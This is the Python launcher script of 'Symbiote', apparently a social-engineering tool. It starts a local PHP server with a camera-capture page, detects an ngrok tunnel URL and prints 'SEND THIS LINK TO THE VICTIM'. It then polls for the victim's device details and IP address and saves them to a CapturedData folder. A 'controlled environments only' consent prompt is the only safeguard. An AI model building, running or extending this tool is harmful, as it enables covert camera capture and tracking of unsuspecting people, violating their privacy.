#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
Symbiote - minimal version (camera + PHP server)
Direct flow: banner -> consent -> checks -> camera -> port -> PHP server
             -> show link -> capture report.
ngrok is NOT managed by the tool: run it yourself, e.g.  ngrok http 1516
If ngrok is already running, its public URL is detected automatically.
For use in controlled environments only.
"""
import os
from os import system
from time import sleep
from sys import exit
from Checks import net, checkPHP
from logo import banner, end

RED, CYAN, GREEN, DEFAULT, YELLOW = '\033[1;91m', '\033[1;36m', '\033[1;32m', '\033[0m', '\033[1;33m'
PORT_DEFAULT = 1516


def clear():
    system('clear')


def consent():
    clear()
    banner()
    r = input("\nTO BE USED IN CONTROLLED ENVIRONMENTS ONLY. Do you agree? (Y/n): ").strip().lower()
    if r == 'n':
        print("\nYOU ARE NOT AUTHORIZED TO USE THIS TOOL. CONTROLLED ENVIRONMENTS ONLY.\n")
        exit()
    sleep(0.5)


def getpath():
    """Writes the absolute CapturedData path for both sites."""
    cwd = os.path.join(os.getcwd(), 'CapturedData') + '/'
    for d in ('www_f', 'www_b'):
        with open('Server/%s/path.txt' % d, 'w') as f:
            f.write(cwd)


def fresh():
    """Cleans runtime files from the previous session."""
    for d in ('www_f', 'www_b'):
        for fn in ('ip.txt', 'Log.log', 'path.txt'):
            system('rm -f Server/%s/%s && touch Server/%s/%s' % (d, fn, d, fn))
    system('rm -f link.url && touch link.url')


def chooseCamera():
    while True:
        clear()
        banner()
        print("\n[{0}#{1}] Select the camera:\n".format(RED, DEFAULT))
        print("  [{0}1{1}] Veridia  (front + back camera switch)".format(CYAN, DEFAULT))
        print("  [{0}2{1}] Back     (original page)".format(CYAN, DEFAULT))
        c = input("\n<Symbiote> ----> ").strip()
        if c in ('1', ''):
            return 'www_f'
        if c == '2':
            return 'www_b'


def choosePort():
    c = input("\nLocal port [Enter = {0}]: ".format(PORT_DEFAULT)).strip()
    if c == '':
        return str(PORT_DEFAULT)
    try:
        if 1 <= int(c) <= 65535:
            return c
    except ValueError:
        pass
    return choosePort()


def getNgrokUrl():
    """If ngrok is already running, returns its public URL, else ''."""
    url = ''
    try:
        out = os.popen(
            'curl -s -m 2 http://127.0.0.1:4040/api/tunnels | '
            'grep -o "public_url[^,]*" | head -1').read().strip()
        if 'http' in out:
            url = out.split('"')[-2] if out.count('"') >= 2 else ''
    except Exception:
        pass
    return url


def start(port, name):
    clear()
    banner()
    print("\n[{0}*{1}] Starting PHP server on port {2}...".format(CYAN, DEFAULT, port))
    system('fuser -k %s/tcp > /dev/null 2>&1' % port)
    system('cd Server/%s/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &' % (name, port))
    sleep(2)

    # If ngrok is already up, use its URL. The tool never manages ngrok.
    url = ''
    for _ in range(3):
        url = getNgrokUrl()
        if url:
            break
        sleep(1)

    report(url, port, name)


def report(url, port, name):
    clear()
    banner()
    print("\n[{0}*{1}] SEND THIS LINK TO THE VICTIM:".format(YELLOW, DEFAULT))
    if url:
        print("  Public URL: {0}{1}{2}".format(GREEN, url, DEFAULT))
    else:
        print("  Local URL:  {0}http://127.0.0.1:{1}{2}".format(GREEN, port, DEFAULT))
        print("\n  [{0}*{1}] Start your tunnel manually, e.g.:  {2}ngrok http {3}".format(
            YELLOW, DEFAULT, CYAN, port))
        print("  [{0}*{1}] If ngrok is already running, restart this tool or press ENTER to re-check.".format(
            YELLOW, DEFAULT))
    print("\n  ENTER = refresh captures | X = exit\n")

    last = ''
    while True:
        try:
            with open('Server/%s/ip.txt' % name) as f:
                data = f.read().rstrip()
        except OSError:
            data = ''
        if data:
            print("\n [{0}DEVICE DETAILS FOUND{1}]\n {2}".format(YELLOW, DEFAULT, data))
            log = ''
            try:
                with open('Server/%s/Log.log' % name) as f:
                    log = f.read().rstrip()
            except OSError:
                pass
            if log:
                print(log)
            if data != last:
                system('cat Server/%s/ip.txt >> CapturedData/ip.txt' % name)
                last = data
        ans = input("\n<Symbiote> ----> ").strip().upper()
        if ans == 'X':
            stop(port, name)
            end()
            exit()
        # Re-check ngrok in case it was started after launching the tool
        if not url:
            url = getNgrokUrl()
        clear()
        banner()
        print("\n[{0}*{1}] SEND THIS LINK TO THE VICTIM:".format(YELLOW, DEFAULT))
        if url:
            print("  Public URL: {0}{1}{2}".format(GREEN, url, DEFAULT))
        else:
            print("  Local URL:  {0}http://127.0.0.1:{1}{2}".format(GREEN, port, DEFAULT))
            print("\n  [{0}*{1}] Start your tunnel manually, e.g.:  {2}ngrok http {3}".format(
                YELLOW, DEFAULT, CYAN, port))
        print("\n  ENTER = refresh captures | X = exit\n")


def stop(port, name):
    try:
        data = open('Server/%s/ip.txt' % name).read().rstrip()
        saved = ''
        if os.path.isfile('CapturedData/ip.txt'):
            saved = open('CapturedData/ip.txt').read()
        if data and data not in saved:
            with open('CapturedData/ip.txt', 'a') as f:
                f.write(data + '\n')
    except OSError:
        pass
    system('fuser -k %s/tcp > /dev/null 2>&1' % port)
    fresh()


if __name__ == '__main__':
    clear()
    banner()
    sleep(1)
    consent()
    net()
    checkPHP()
    fresh()
    getpath()
    camera = chooseCamera()
    port = choosePort()
    start(port, camera)
